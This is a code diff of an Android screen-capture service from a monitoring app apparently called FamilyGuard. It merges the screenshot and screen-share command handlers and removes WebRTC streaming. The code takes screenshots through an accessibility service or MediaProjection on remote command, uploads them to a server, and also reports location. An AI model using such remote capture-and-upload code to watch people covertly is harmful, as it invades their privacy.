@@ -35,9 +35,6 @@ class ScreenCaptureService : Service() {
     private var reader: ImageReader? = null
     private var w = 1080; private var h = 1920; private var dpi = 320
 
-    private var savedProjectionIntent: Intent? = null
-    private var webRTC: WebRTCManager? = null
-
     private lateinit var api: Api
     private lateinit var deviceId: String
 
@@ -84,9 +81,6 @@ class ScreenCaptureService : Service() {
             @Suppress("DEPRECATION") intent?.getParcelableExtra("code")
 
         if (code != null && code != Activity.RESULT_CANCELED && data != null) {
-            // Screen capture ruxsatini saqlab qo'yamiz (WebRTC uchun ham kerak)
-            savedProjectionIntent = data
-
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                 val b = getSystemService(WindowManager::class.java).currentWindowMetrics.bounds
                 w = b.width(); h = b.height()
@@ -125,7 +119,6 @@ class ScreenCaptureService : Service() {
         running   = false
         isRunning = false
         instance  = null
-        webRTC?.stopStream()
         display?.release()
         reader?.close()
         projection?.stop()
@@ -207,31 +200,17 @@ class ScreenCaptureService : Service() {
             try {
                 when (type) {
 
-                    "SCREENSHOT" -> {
-    val b64 = when {
-        Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
-        FamilyGuardAccessibilityService.isEnabled() ->
-            kotlinx.coroutines.runBlocking { 
-                FamilyGuardAccessibilityService.takeShot() 
-            }
-        projection != null && reader != null -> capture()
-        else -> null
-    }
-    if (b64 != null) api.updateStatus(id, "DONE", api.uploadImage(b64))
-    else api.updateStatus(id, "FAILED")
-}
-
-                    "SCREEN_SHARE" -> {
-    val b64 = when {
-        Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
-        FamilyGuardAccessibilityService.isEnabled() ->
-            FamilyGuardAccessibilityService.takeShot()
-        projection != null && reader != null -> capture()
-        else -> null
-    }
-    if (b64 != null) api.updateStatus(id, "DONE", api.uploadImage(b64))
-    else api.updateStatus(id, "FAILED")
-}
+                    "SCREENSHOT", "SCREEN_SHARE" -> {
+                        val b64 = when {
+                            Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
+                            FamilyGuardAccessibilityService.isEnabled() ->
+                                FamilyGuardAccessibilityService.takeShot()
+                            projection != null && reader != null -> capture()
+                            else -> null
+                        }
+                        if (b64 != null) api.updateStatus(id, "DONE", api.uploadImage(b64))
+                        else api.updateStatus(id, "FAILED")
+                    }
 
                     "LOCATION" -> {
                         val loc = LocationHelper(this).getLocation()
